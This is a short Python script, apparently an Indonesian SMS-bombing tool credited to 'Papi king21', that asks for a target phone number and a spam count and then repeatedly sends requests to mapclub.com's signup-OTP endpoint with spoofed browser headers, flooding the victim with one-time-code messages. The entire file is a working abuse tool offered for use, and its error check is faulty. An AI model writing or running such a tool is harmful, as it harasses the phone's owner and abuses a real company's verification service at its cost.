import json
import requests
import os
import sys


def main():
	os.system('clear')
	os.system('figlet papiking21')
	banner='''

	[+]AUTHOR:Papi king21
	[+]Youtube : Papi King21
	'''
	print(banner)
	no = input(' target : ')
	jum = input('Jumlah spam : ')


	head = {
	"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
	"Referer": "https://www.mapclub.com/en/user/signup",
	"Host": "cmsapi.mapclub.com",
	}


	dat = {
	'phone': no
	}

	for x in range (int(jum)):
		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
		if 'eror' in leosureo:
			print('gagal Mengirim ' + no)

		else:
			print('succes mengirim ' + no)



main()

